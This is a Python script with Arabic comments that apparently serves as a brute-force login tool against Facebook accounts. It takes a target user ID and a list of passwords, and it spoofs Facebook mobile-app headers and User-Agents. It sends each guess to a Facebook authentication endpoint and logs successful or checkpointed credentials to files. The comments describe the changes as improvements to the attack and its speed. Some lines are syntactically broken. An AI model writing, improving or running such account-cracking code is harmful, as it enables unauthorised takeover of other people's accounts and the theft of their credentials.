
import os
import requests
import random
from rich.console import Console
from rich.table import Table
from concurrent.futures import ThreadPoolExecutor

console = Console()

# تعديل اسم الأداة
TOOL_NAME = "شروحات السوري"

# إضافة قائمة محسّنة من User-Agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    # يمكنك إضافة المزيد من الوكلاء هنا
]

# تحسين طباعة النتائج
def print_result(uid, pw, result):
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("User ID", style="dim", width=12)
    table.add_column("Password", width=20)
    table.add_column("Status", justify="right")
    table.add_row(uid, pw, result)
    console.print(table)

def attack(uid, pw_list):
    for pw in pw_list:
        pw = pw.lower()
        user_agent = random.choice(user_agents)
        session = requests.Session()
        headers = {
            "user-agent": user_agent,
            "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
            "x-fb-sim-hni": str(random.randint(20000, 40000)),
            "x-fb-net-hni": str(random.randint(20000, 40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"
        }

        # محاولة تسجيل الدخول
        response = session.get(f"https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pw}&generate_session_cookies=1", headers=headers)
        
        if "session_key" in response.text and "EAAA" in response.text:
            print_result(uid, pw, "[[Success]]")
            with open("success_log.txt", "a") as success_file:
                success_file.write(f"{uid} | {pw}
")
            break
        elif "www.facebook.com" in response.json().get("error_msg", ""):
            print_result(uid, pw, "[[Checkpoint]]")
            with open("checkpoint_log.txt", "a").write(f"{uid} | {pw}
")
            break
        else:
            continue

def main():
    console.print(f"[bold green]{TOOL_NAME}[/bold green] - تحسينات على الهجمات وواجهة المستخدم", style="bold yellow")
    
    uid = input("أدخل معرف المستخدم: ")
    pw_list = input("أدخل قائمة كلمات المرور (مفصولة بفواصل): ").split(",")
    
    # استخدام ThreadPoolExecutor لزيادة سرعة الهجوم
    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.submit(attack, uid, pw_list)

if __name__ == "__main__":
    main()
